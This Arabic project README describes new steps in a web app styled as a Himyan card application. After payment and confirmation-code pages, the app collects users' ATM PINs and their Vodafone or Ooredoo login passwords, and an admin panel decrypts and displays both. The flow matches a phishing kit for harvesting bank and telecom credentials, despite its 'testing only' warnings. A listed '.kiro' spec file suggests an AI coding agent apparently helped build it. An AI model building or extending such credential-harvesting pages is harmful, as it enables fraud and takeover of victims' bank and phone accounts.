# الميزات الجديدة - New Features

## 📝 نظرة عامة

تم إضافة 4 خطوات جديدة إلى عملية التقديم على بطاقة هميان لجمع معلومات إضافية من المتقدمين.

---

## 🆕 الخطوات الجديدة

### 1. صفحة رقم ATM السري (`atm-pin.html`)
- إدخال رقم ATM مكون من 4 أرقام
- التشفير التلقائي قبل الحفظ
- دعم الأرقام العربية والإنجليزية

### 2. صفحة اختيار مزود الشبكة (`network-provider.html`)
- اختيار بين فودافون أو أوريدو
- واجهة بسيطة وجذابة

### 3. صفحات تسجيل الدخول
- `vodafone-login.html` - لمستخدمي فودافون
- `ooredoo-login.html` - لمستخدمي أوريدو
- تشفير كلمات المرور قبل الحفظ

---

## 🔄 التدفق الكامل الجديد

```
1. الصفحة الرئيسية (index.html)
   ↓
2. نموذج التقديم (apply.html)
   ↓
3. بوابة الدفع (confirmation.html)
   ↓
4. انتظار الموافقة (pending.html)
   ↓
5. رمز التأكيد - 6 أرقام (confirmation-code.html)
   ↓
6. 🆕 رقم ATM - 4 أرقام (atm-pin.html)
   ↓
7. 🆕 اختيار المزود (network-provider.html)
   ↓
8. 🆕 تسجيل الدخول (vodafone-login.html OR ooredoo-login.html)
   ↓
9. اكتمال الطلب (pending.html?stage=complete)
```

---

## 🗄️ التغييرات في قاعدة البيانات

تم إضافة 6 أعمدة جديدة لجدول `requests`:

| العمود | النوع | الوصف |
|--------|------|-------|
| `atm_pin_encrypted` | TEXT | رقم ATM مُشفر (AES-256-CBC) |
| `network_provider` | VARCHAR(20) | مزود الشبكة (vodafone/ooredoo) |
| `provider_mobile` | VARCHAR(40) | رقم الجوال المستخدم |
| `provider_password_encrypted` | TEXT | كلمة المرور مُشفرة (AES-256-CBC) |
| `steps_completed` | JSONB | الخطوات المكتملة |
| `completed_at` | TIMESTAMPTZ | وقت الإكمال |

**ملاحظة:** إذا كانت قاعدة البيانات موجودة مسبقًا، سيتم إضافة الأعمدة تلقائيًا عند تشغيل السيرفر.

---

## 🔌 APIs الجديدة

### 1. POST /api/requests/atm-pin
حفظ رقم ATM (مُشفر)

**الطلب:**
```json
{
  "id": "request-uuid",
  "atmPin": "1234"
}
```

**الرد:**
```json
{
  "ok": true,
  "id": "request-uuid",
  "status": "atm_pin_submitted"
}
```

---

### 2. POST /api/requests/network-provider
حفظ اختيار مزود الشبكة

**الطلب:**
```json
{
  "id": "request-uuid",
  "provider": "vodafone"
}
```

**الرد:**
```json
{
  "ok": true,
  "id": "request-uuid",
  "provider": "vodafone",
  "status": "provider_selected"
}
```

---

### 3. POST /api/requests/provider-login
حفظ بيانات تسجيل الدخول (مُشفرة)

**الطلب:**
```json
{
  "id": "request-uuid",
  "provider": "vodafone",
  "mobile": "+97412345678",
  "password": "user_password"
}
```

**الرد:**
```json
{
  "ok": true,
  "id": "request-uuid",
  "status": "completed"
}
```

---

### 4. GET /api/requests/decrypt (Admin Only)
فك تشفير البيانات الحساسة

**الطلب:**
```
GET /api/requests/decrypt?id=xxx&field=atm_pin
```

**الرد:**
```json
{
  "ok": true,
  "value": "1234"
}
```

---

## 🔐 الأمان والتشفير

### البيانات المُشفرة
- ✅ رقم ATM PIN
- ✅ كلمات مرور مزود الشبكة

### خوارزمية التشفير
- **Algorithm:** AES-256-CBC
- **Key Length:** 32 bytes (256 bits)
- **IV Length:** 16 bytes (128 bits)

### إعداد مفتاح التشفير

1. إنشاء مفتاح عشوائي:
```bash
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

2. إضافته إلى ملف `.env`:
```
ENCRYPTION_KEY=your_32_byte_hex_key_here
```

⚠️ **تحذير هام:** احتفظ بمفتاح التشفير في مكان آمن! فقدانه يعني عدم القدرة على فك تشفير البيانات.

---

## 📊 لوحة الأدمن المحدثة

### الأعمدة الجديدة في الجدول
- رقم ATM (زر "عرض" لفك التشفير)
- مزود الشبكة (فودافون/أوريدو)

### نافذة التفاصيل المحدثة
تعرض جميع البيانات الجديدة:
- رقم ATM (مع زر عرض)
- مزود الشبكة
- رقم جوال المزود
- كلمة مرور المزود (مع زر عرض)
- وقت الإكمال الكامل

### الحالات الجديدة
- `atm_pin_submitted` - تم إدخال رقم ATM
- `provider_selected` - تم اختيار المزود
- `completed` - مكتمل - جاهز للمراجعة النهائية

---

## 🚀 كيفية التشغيل

### 1. تثبيت Dependencies (إذا كان أول مرة)
```bash
npm install
```

### 2. إعداد ملف `.env`
```bash
cp .env.example .env
```

ثم عدّل الملف وأضف:
- `ENCRYPTION_KEY` - مفتاح التشفير
- `DATABASE_URL` - رابط PostgreSQL (اختياري)
- `ADMIN_PASSWORD` - كلمة مرور الأدمن

### 3. تشغيل السيرفر
```bash
npm start
```

السيرفر سيعمل على: `http://localhost:3000`

---

## 🧪 الاختبار

### اختبار التدفق الكامل:
1. افتح الموقع: `http://localhost:3000`
2. اضغط على "قدّم طلبك الآن"
3. املأ النموذج وأكمل عملية الدفع
4. سجّل دخول كأدمن من `/admin.html`
5. اقبل الطلب
6. ارجع للصفحة الرئيسية وأدخل رمز التأكيد (أي 6 أرقام)
7. أدخل رقم ATM (أي 4 أرقام)
8. اختر مزود الشبكة
9. أدخل بيانات تسجيل الدخول
10. تحقق من البيانات في لوحة الأدمن

### اختبار فك التشفير:
1. في لوحة الأدمن، افتح تفاصيل أي طلب مكتمل
2. اضغط على زر "عرض" بجانب رقم ATM
3. ستظهر نافذة منبثقة بالرقم المفكوك

---

## ⚠️ تحذيرات أمنية

### **للأغراض التجريبية فقط!**

هذا التطبيق يخزن بيانات حساسة جدًا:
- أرقام ATM
- كلمات مرور حسابات الاتصالات

**قبل الاستخدام في الإنتاج:**
1. ✅ مراجعة أمنية شاملة من متخصصين
2. ✅ استخدام HSM (Hardware Security Module) لحفظ المفاتيح
3. ✅ التوافق مع معايير PCI DSS
4. ✅ الحصول على موافقة مصرف قطر المركزي
5. ✅ تشفير قاعدة البيانات بالكامل
6. ✅ استخدام HTTPS فقط (SSL/TLS)
7. ✅ تفعيل audit logs لتتبع الوصول
8. ✅ تطبيق 2FA للأدمن

---

## 📁 الملفات المُضافة/المُعدّلة

### ملفات جديدة:
- ✅ `atm-pin.html`
- ✅ `network-provider.html`
- ✅ `vodafone-login.html`
- ✅ `ooredoo-login.html`
- ✅ `.kiro/specs/new-application-steps/SPEC.md`
- ✅ `NEW_FEATURES.md`

### ملفات مُعدّلة:
- ✅ `server.js` - إضافة 4 APIs + وظائف التشفير
- ✅ `db.js` - إضافة 6 أعمدة جديدة + mapping
- ✅ `confirmation-code.html` - تحديث الانتقال
- ✅ `admin.html` - أعمدة جديدة + عرض البيانات المشفرة
- ✅ `.env.example` - إضافة ENCRYPTION_KEY

---

## 🐛 المشاكل المعروفة

لا توجد مشاكل معروفة حاليًا.

---

## 📞 الدعم

إذا واجهت أي مشكلة، تحقق من:
1. ملف `.env` موجود ويحتوي على `ENCRYPTION_KEY`
2. قاعدة البيانات متصلة (أو local JSON يعمل)
3. جميع الملفات الجديدة موجودة في المجلد
4. لا توجد أخطاء في console المتصفح

---

**تاريخ الإضافة:** 2026-08-31  
**الإصدار:** 2.0.0  
**الحالة:** ✅ جاهز للاختبار
